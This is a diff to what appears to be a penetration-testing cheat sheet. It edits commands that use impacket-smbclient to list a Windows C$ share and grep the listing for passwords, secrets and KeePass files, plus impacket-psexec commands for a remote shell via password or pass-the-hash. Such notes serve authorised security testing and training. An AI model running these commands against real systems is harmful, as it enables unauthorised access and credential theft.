@@ -108,7 +108,7 @@ password # Change the User's Password
 Search whole drive on impacket-smbclient
 ```bash
 # search C drive for useful info
-└─$ script -q -c "impacket-smbclient username:'password'@target_ip" tree_capture.txt
+script -q -c "impacket-smbclient username:'password'@target_ip" tree_capture.txt
 
 Type help for list of commands
 # use C$
@@ -120,12 +120,13 @@ Type help for list of commands
 
 ```bash
 # clean file & grep file for hits 
-└─$ sed -r 's/\x1B\[[0-9;?]*[ -/]*[@-~]//g' 160_tree_capture.txt > clean_tree.txt
+sed -r 's/\x1B\[[0-9;?]*[ -/]*[@-~]//g' 160_tree_capture.txt > clean_tree.txt
 
-└─$ grep -iE 'Desktop|Documents|Downloads|\.docx|\.xlsx|\.pdf|kdbx|cred|password|secret' clean_tree.txt > win_hits.txt
+# delete noise under appdata and .ini files 
+sed -r 's/\x1B\[[0-9;?]*[ -/]*[@-~]//g' tree_capture.txt | grep -vi 'appdata'| grep -vi '\.ini' > clean_tree.txt
+
+grep -iE 'Desktop|Documents|Downloads|\.docx|\.xlsx|\.pdf|kdbx|cred|password|secret' clean_tree.txt > win_hits.txt
 ```
-
-
 
 
 ## Remote Shell
@@ -140,7 +141,7 @@ If you have Credentials with usually local admin privileges & can ...
 
 ```bash
 # Psexec via Password
-impacket-psexec 'domain/user:password@target'
+impacket-psexec domain/user:'password'@target
 
 # Psexec via Pass-the-Hash
 impacket-psexec domain.com/username@target_ip -hashes ntlm_hash:ntlm_hash
